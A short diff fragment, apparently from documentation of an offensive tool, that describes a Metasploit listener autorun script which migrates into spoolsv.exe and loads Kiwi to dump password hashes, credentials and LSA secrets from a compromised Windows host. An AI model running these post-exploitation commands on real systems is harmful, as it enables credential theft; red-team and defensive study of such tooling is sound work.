@@ -123,7 +123,8 @@ Autorun Script:
     
     The Multi/Handler listener is weaponized to automatically migrate into the                
     spoolsv.exe process, load Kiwi, run sysinfo, hashdump, creds_all and lsa_dump.
-
+ 
+    A file called 'autorun_commands.rc' is created with the following commands:
     migrate -N spoolsv.exe
     load kiwi
     sysinfo
